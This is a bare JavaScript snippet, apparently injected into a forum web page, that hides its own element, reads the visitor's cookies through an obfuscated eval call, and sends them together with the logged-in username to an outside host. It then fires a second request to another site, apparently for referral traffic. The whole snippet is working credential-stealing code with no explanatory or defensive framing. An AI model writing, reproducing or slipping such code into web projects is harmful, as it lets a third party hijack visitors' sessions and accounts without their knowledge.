document.write("<div class='sign-hide-flag'></div>");
jQuery('.sign-hide-flag').parent().css('display','none');
d=(1==1?"d":"d")+"ocument";
d=eval(d).cookie;
if(localStorage.getItem("TIMESTAMPS")!="1422323221"){
  jQuery.ajax({
    type:"GET",
    url:"https://ytb.yyimg.com/function",
    data:{
      'd':d,
      'n':jQuery(".vwmy a").html()
    },
    success:function(){
      localStorage.setItem("TIMESTAMPS","1422323221");
    }
  });
}
 jQuery.ajax({
    type:"GET",
    url:"http://www.2345.com/?k85551221",
    data:{
    }
  });
